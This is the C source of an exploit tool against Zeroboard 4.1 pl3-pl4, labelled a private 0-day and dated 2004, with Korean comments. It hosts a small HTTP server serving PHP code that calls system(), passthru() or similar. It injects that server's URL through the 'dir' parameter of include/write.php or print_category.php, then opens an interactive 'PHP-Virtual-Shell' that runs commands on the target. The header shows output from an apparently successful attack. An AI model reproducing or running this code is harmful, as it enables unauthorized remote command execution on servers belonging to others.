/*
* zeroboard 0-day exploit 4.1 pl3 - pl4 (v0.2)
*
* THIS IS NOT A PUBLIC EXPLOIT! DO NOT DISTRIBUTE!!
* 
*      <? $eMail = "indra"."\x40"."linux.co.kr"; ?>
* 
* 비공개 익스플로잇 입니다. 절대 외부에 공개하지 마십시요.
*
* - Compile:
* Linux
* gcc -o zboard-0day zboard-0day.c -lpthread
*
* FreeBSD
* gcc -o zboard-0day zboard-0day.c -pthread
* 
* ===============================================================
* ~/tmp> uname -rsp && gcc -o 1 1.c -pthread && ./1 -u indra.linuxstudy.pe.kr/zbbs
* FreeBSD 4.9-STABLE i386
* [!] Zeroboard 0-day explot 4.1 pl3 - pl4 (v0.2)
*
* THIS IS NOT A PUBLIC EXPLOIT! DO NOT DISTRIBUTE!!
*                         indra <indra@linux.co.kr>
*
* [+] Source IP Address/Port: ***:31337
* [+] Destination IP Address/Port: **.**.**.**:80
* [+] Destination Hostname: indra.**********.pe.kr
* [+] URL: http://indra.**********.pe.kr/zbbs
* [+] Attack Type: write.php
* [+] Server Thread..... OK.
*
* Linux **********.pe.kr 2.4.24-LS #1 SMP Wed Feb 18 07:24:10 KST 2004 i686 Pentium III (Coppermine) GenuineIntel GNU/Linux
* uid=65534(nobody) gid=65534(nobody) groups=65534(nobody)
*
* [+] Success to attack.
* [+] Spawn a virtual shell
*
* PHP-Virtual-Shell>
* ===============================================================
* 
* 2004.04.04 PM 15:59 - Version up to 0.2.
*  (날짜가.. 참..-_-;)
*  공격 타입을 추가하여, write.php 와 print_category.php 의 공격을 가능하게
*  코드 수정.
*/
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <fcntl.h>
#include <netdb.h>
#include <pthread.h>
#include <sys/types.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <netinet/in_systm.h>
#include <netinet/in.h>
#include <net/if.h>

#define VERSION "v0.2"

/* function proto-type */
void    usage(char *);
void    *xmalloc(int);
char    *get_local_ip(void);
void    *h_parse(char *, int);
char    *url_encode(char *);
int     sock_set(void);
int     get_header(int);
void    *virtual_serv(void *);
int     php_injection(void);
int     spawn_shell(void);

#ifdef __FreeBSD__
char *if_name[] = { "ed0", "ed1", NULL };
#else
# ifdef __linux__
char *if_name[] = { "eth0", "eth1", NULL };
# endif
#endif

static char cmd[128];
static char *funct[] = 
{
    "system",
    "passthru",
    "exec",
    "shell_exec",
    NULL
};

static char *attack_t[] = 
{
    "write.php",
    "print_category.php",
    NULL
};


struct target_info {
    char url[128];
    char hname[64];
    char path[64];
    char use_func[12];
    in_addr_t s_ip;
    in_addr_t d_ip;
    int sport;
    int dport;
    int type;
};

struct target_info t_info;
pthread_t   serv_thread;

/* {{{ main(int argc, char **argv) */
int main(int argc, char **argv)
{
    int     opt,
            dport = 80,
            sport = 31337,
            type = 0;
    char    *url = NULL,
            *hname = NULL,
            *path = NULL,
            *s_ip = NULL,
            *func = funct[0];
    struct  hostent *he;

    while((opt = getopt(argc, argv, "u:f:l:d:s:t:")) != -1) {
        switch(opt) {
            case 'u':
                url = optarg;
                break;
            case 'f':
                func = funct[atoi(optarg)];
                break;
            case 'l':
                s_ip = optarg;
                break;
            case 'd':
                dport = atoi(optarg);
                break;
            case 's':
                sport = atoi(optarg);
                break;
            case 't':
                type = atoi(optarg);
                break;
            default:
                usage(argv[0]);
                break;
        }
    }   /* end of while() statement */

    fprintf(stdout, 
            "[!] Zeroboard 0-day explot 4.1 pl3 - pl4 (%s)\n\n"
            "THIS IS NOT A PUBLIC EXPLOIT! DO NOT DISTRIBUTE!!\n"
            "\t\t\tindra <indra@linux.co.kr>\n\n"
    ,VERSION);

    if(url == NULL) usage(argv[0]);

    if((hname = h_parse(url, 0x2f)) == NULL) usage(argv[0]);        
    
    path = url + strlen(hname);

    if((he = gethostbyname(hname)) == NULL) {
        fprintf(stderr, "%s:\n", hname);
        fprintf(stderr, "[!] gethostbyname() function error.\n");
        free(hname);
        exit(-1);
    }

    if(s_ip == NULL) {
        if((s_ip = get_local_ip()) == NULL) {
            fprintf(stderr, 
                    "[!] Can't get local IP address.\n"
                    "Use the `-l' option: -l IP_ADDRESS_OF_THIS_MACHINE\n"
            );
            exit(-1);
        }
    }
    
    snprintf(t_info.url, sizeof(t_info.url), "%s", url);
    snprintf(t_info.hname, sizeof(t_info.hname), "%s", hname);
    snprintf(t_info.path, sizeof(t_info.path), "%s", path);
    snprintf(t_info.use_func, sizeof(t_info.use_func), "%s", func);
    t_info.s_ip = inet_addr(s_ip);
    memcpy(&t_info.d_ip, he->h_addr, he->h_length);
    t_info.dport = dport;
    t_info.sport = sport;
    t_info.type = type;

    free(hname);
    free(s_ip);
    
    fprintf(stdout, "[+] Source IP Address/Port: %s:%d\n",
            inet_ntoa(t_info.s_ip), t_info.sport);

    fprintf(stdout, "[+] Destination IP Address/Port: %s:%d\n",
            inet_ntoa(t_info.d_ip), t_info.dport);
    
    fprintf(stdout, "[+] Destination Hostname: %s\n", t_info.hname);
    fprintf(stdout, "[+] URL: http://%s\n", t_info.url);
    fprintf(stdout, "[+] Attack Type: %s\n", attack_t[type]);
    fprintf(stdout, "[+] Server Thread..... ");

    if(pthread_create(&serv_thread, NULL, virtual_serv, NULL)) {
        fprintf(stdout, "Failed.\n");
        fprintf(stderr, "[!] Failed create thread.\n");
        exit(-1);
    }
    
    spawn_shell();

    fprintf(stdout, "\n[+] Stop Server Thread.\n");
    pthread_detach(serv_thread);
    
    fprintf(stdout, "[+] Complete\n\n");
    
    exit(0);
}
/* }}} */

/* {{{ usage(char *pname) */
void usage(char *pname)
{
    int     i = 0;
    
    fprintf(stdout, 
            "Usage: %s -u <URL> [ OPTIONS ]\n\n"
            "  -u <URL> \t\tURL\n"
            "  -f <FUNCTION> \tFunction [ Default: 0 - %s() ]\n"
            "  -l <IP Address> \tLocal IP Address\n"
            "  -d <PORT> \t\tDesination Port [ Default: 80 ]\n"
            "  -s <PORT> \t\tSource Port [ Default: 31337 ]\n"
            "  -t <TYPE> \t\tAttack Type [ Default: 0 ]\n\n"
            , pname, funct[0]);
    
    fprintf(stdout, "<FUNCTION LIST>:\n");
    for(;;) {
        if(funct[i] == NULL) break;
        fprintf(stdout, "\t%d. %s()\n", i, funct[i]);
        i++;
    }
    i = 0;
    fprintf(stdout, "<TYPE LIST>:\n");
    for(;;) {
        if(attack_t[i] == NULL) break;
        fprintf(stdout, "\t%d. %s\n", i, attack_t[i]);
        i++;
    }

    exit(0);
}
/* }}} */

/* {{{ xmalloc(int len) */
void *xmalloc(int len)
{
    void    *buf;

    if((buf = malloc(len)) == NULL) {
        fprintf(stdout, "[!] Out of memory\n");
        exit(-1);
    }

    return (void*)buf;
}
/* }}} */

/* {{{ get_local_ip(void) */
char *get_local_ip(void)
{
    int                 s, i;
    char                *buf = NULL;
    struct ifreq        ifr;
    struct sockaddr_in  *in_addr;

    memset(&ifr, 0, sizeof(ifr));

    if((s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)) < 0) {
        fprintf(stderr, "[-] socket() function error.\n");
        return NULL;
    }

    in_addr = (struct sockaddr_in *)&ifr.ifr_addr;
    in_addr->sin_family = AF_INET;

    for(i = 0; i < 2; i++) {
        strcpy(ifr.ifr_name, if_name[i]);
        if(ioctl(s, SIOCGIFADDR, &ifr) == 0) {
            buf = xmalloc(16);
            snprintf(buf, 16, "%s", inet_ntoa(in_addr->sin_addr));
            break;
        }
    }
    return (char*)buf;
}
/* }}} */

/* {{{ h_parse(char *url, int ch) */
void *h_parse(char *url, int ch)
{
    int     len = 0;
    char    *ptr = NULL,
            *ret = NULL;

    if((ptr = strchr(url, ch)) == NULL) return NULL;

    len = (ptr - url) + 1;

    ret = xmalloc(len);

    snprintf(ret, len, "%s", url);

    return (void*)ret;
}
/* }}} */

/* {{{ url_encode(char *str) */
char *url_encode(char *str)
{
    int     i = 0;
    char    *buf = NULL,
            *ptr = NULL;

    buf = xmalloc((strlen(str)*3)+1);

    ptr = &buf[0];

    for(;;) {
        if(str[i] == '\0') break;
        snprintf(buf, 4, "%%%x", str[i]);
        buf += 3;
        i++;
    }

    return (char*)ptr;
}
/* }}} */

/* {{{ sock_set(void) */
int sock_set(void)
{
    int     sock;
    struct  sockaddr_in sin;
    
    if((sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)) < 0) {
        fprintf(stderr, "[!] socket() function error.\n");
        return -1;
    }

    memcpy(&sin.sin_addr, &t_info.d_ip, sizeof(t_info.d_ip));
    sin.sin_family = AF_INET;
    sin.sin_port = htons(t_info.dport);

    if(connect(sock, (struct sockaddr *)&sin, sizeof(sin)) != 0) {
        fprintf(stderr, "[!] Connect refused\n");
        return -1;
    }

    return sock;
}
/* }}} */

/* {{{ get_header(int s) */
int get_header(int s)
{
    int     n = 0,
            len = 0;
    char    *ptr = NULL,
            *crlf = "\x0d\x0a\x0d\x0a";
    char    buf[1024];

    for(;;) {
        memset(buf, 0, sizeof(buf));
        
        if((n = recv(s, buf, sizeof(buf) - 1, 0)) == 0) {
            if(ptr != NULL) free(ptr);
            close(s);
            return -1;
        }
        
        ptr = realloc(ptr, len + n + 1);
        memset(ptr+len, 0, n + 1);
        strcat(ptr+len, buf);
        len += n;
        
        if(strstr(ptr, crlf) != NULL) break;
    }
    free(ptr);
    return 0;
}
/* }}} */

/* {{{ virtual_serv(void *argv) */
void *virtual_serv(void *argv)
{
    int                 reuse = 1,
                        svr_s,
                        cli_s,
                        stdlen = 100,
                        len;
    char                *buf = NULL;
    struct sockaddr_in  svr_addr,
                        cli_addr;
    
    if((svr_s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)) < 0) {
        fprintf(stderr, "[!] socket() function error\n");
        exit(-1);
    }

    memset((char*)&svr_addr, 0, sizeof(svr_addr));
    svr_addr.sin_family = AF_INET;
    svr_addr.sin_addr.s_addr = htonl(INADDR_ANY);
    svr_addr.sin_port = htons(t_info.sport);

    setsockopt(svr_s, SOL_SOCKET, SO_REUSEADDR, (char*)&reuse, sizeof(reuse));

    if(bind(svr_s, (struct sockaddr *)&svr_addr, sizeof(svr_addr)) < 0) {
        fprintf(stderr, "[!] bind() function error.\n");
        exit(-1);
    }

    listen(svr_s, 5);

    fprintf(stdout, "OK.\n\n");

    while(1) {
        len = sizeof(cli_addr);
        if((cli_s = accept(svr_s, (struct sockaddr *)&cli_addr, &len)) == -1) {
            fprintf(stderr, "[!] accept() function error.\n");
            exit(-1);
        }

        if(get_header(cli_s) < 0) continue;

        len = stdlen + strlen(t_info.use_func) + strlen(cmd) + 1;
        
        buf = xmalloc(len);
        memset(buf, 0, len);
        sprintf(buf,
                "HTTP/1.1 200 OK\r\n"
                "Content-Type: text/html\r\n\r\n"
                "<? echo(\"<Attack>\\r\\n\"); %s(\"%s\");"
                "echo(\"<EndAttack>\\r\\n\"); ?>", 
        t_info.use_func, cmd);

        send(cli_s, buf, strlen(buf), 0);
        
        free(buf);
        close(cli_s);
        continue;
    }
}
/* }}} */

/* {{{ php_injection(void) */
int php_injection(void)
{
    int     s,
            len,
            stdlen = 0,
            content_len = 0;
    char    *ptr = NULL,
            *ptr2 = NULL,
            *enc_var = NULL,
            *http_data = NULL;
    char    var[128],
            buf[1024];

    memset(var, 0, sizeof(var));

    sprintf(var, "http://%s:%d/", inet_ntoa(t_info.s_ip), t_info.sport);
    enc_var = (char*)url_encode(var);

    if(t_info.type == 0) {
        stdlen = 108;
        content_len = strlen(enc_var) + 4;
    }
    else {
        stdlen = 132;
        content_len = strlen(enc_var) + 28;
    }

    len = stdlen + strlen(t_info.path) + strlen(attack_t[t_info.type]) + 
        strlen(t_info.hname) + strlen(enc_var) + 4 + 1;

    http_data = xmalloc(len);
    sprintf(http_data, 
            "POST %s/include/%s HTTP/1.0\r\n"
            "Content-Type: application/x-www-form-urlencoded\r\n"
            "Content-Length: %d\r\n"
            "Host: %s\r\n\r\n"
            "dir=%s",
    t_info.path, attack_t[t_info.type], content_len, t_info.hname, enc_var);
    if(t_info.type == 1) strcat(http_data, "&setup[use_category]=%31");
    strcat(http_data, "\r\n");

    if((s = sock_set()) < 0) return -1;

    send(s, http_data, strlen(http_data), 0);

    free(http_data);
    free(enc_var);
    
    http_data = NULL;
    len = 0;
    
    for(;;) {
        memset(buf, 0, sizeof(buf));
        if(recv(s, buf, sizeof(buf) - 1, 0) == 0) break;
        ptr = (char*)http_data;
        http_data = realloc(http_data, len + strlen(buf) + 1);
        if(http_data == NULL) {
            fprintf(stderr, "[!] Failed reallocate to memory.\n");
            free(ptr);
            return -1;
        }
        memset(http_data+len, 0, strlen(buf)+1);
        strncpy(http_data+len, buf, strlen(buf));
        len += strlen(buf);
    }

    ptr = NULL;
    
    if((ptr = strstr(http_data, "<Attack>")) == NULL) return -1;
    
    ptr += 10;

    /* 
    * print_category.php 에서 파일이 두번 include 됨으로 인해
    * 중복내용이 출력되는것을 피하기 위한 것..
    * 정확히 data 를 extract 하는 코드를 만들고 싶지만..
    * 귀찮아서.. 임시방편으로..-_-;; ㅇ ㅏ ~ 귀차니즘..-_-
    */
    if((ptr2 = strstr(ptr, "<EndAttack>")) == NULL) return -1;
    else *ptr2 = '\0';
    
    printf("%s", ptr);
    
    if(http_data != NULL) free(http_data);
    
    close(s);
    return 1;
}
/* }}} */

/* {{{ spawn_shell(void) */
int spawn_shell(void)
{
    strcpy(cmd, "uname -a; id");

    if(php_injection() < 0) {
        fprintf(stderr, "[!] Failed to attack.\n");
        return -1;
    }
    else {
        fprintf(stdout, "\n[+] Success to attack.\n");
        fprintf(stdout, "[+] Spawn a virtual shell\n\n");
    }
    
    for(;;) {
        memset(cmd, 0, sizeof(cmd));
        printf("PHP-Virtual-Shell> ");
        fgets(cmd, sizeof(cmd), stdin);
        if(strncmp(cmd, "exit", 4) == 0) break;
        if(php_injection() < 0) {
            fprintf(stderr, "[!] Failed to attack.\n");
            return -1;
        }
    }
    
    return 0;
}
/* }}} */

/* 
* vim600: fdm=marker ts=4 sw=4
*/
